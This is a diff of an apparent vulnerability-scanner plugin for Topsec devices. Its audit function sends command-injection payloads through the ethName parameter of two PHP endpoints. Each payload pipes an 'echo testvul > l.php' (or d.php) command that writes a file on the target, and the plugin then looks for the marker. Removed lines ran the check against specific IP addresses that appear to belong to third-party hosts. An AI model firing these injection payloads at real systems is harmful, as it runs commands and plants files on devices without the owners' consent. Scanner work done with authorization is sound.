@@ -15,7 +15,7 @@ def assign(service, arg):
         arr = urlparse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
-        
+
     payload='acc/bindipmac/static_restart_arp_action.php?ethName=%20|%20echo%20testvul%20>%20l.php%20|'
     target = arg + payload
     code, head, res, errcode, _ = curl.curl2(target)
@@ -23,7 +23,8 @@ def audit(arg):
     target = arg + payload
     code, head, res, errcode, _ = curl.curl2(target)
     if 'testvul' in res:
-       security_hole(target)
+        security_hole(target)
+        return arg
 
     payload='acc/bindipmac/static_arp.php?ethName=%20|%20echo%20testvul%20>%20d.php%20|'
     target = arg + payload
@@ -35,8 +36,7 @@ def audit(arg):
         security_hole(target)
 
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('topsec', 'http://61.148.24.182/')[1])
-    # audit(assign('topsec', 'http://218.206.217.19:8080/')[1])
-    # audit(assign('topsec', 'http://61.54.222.39:8080/')[1])
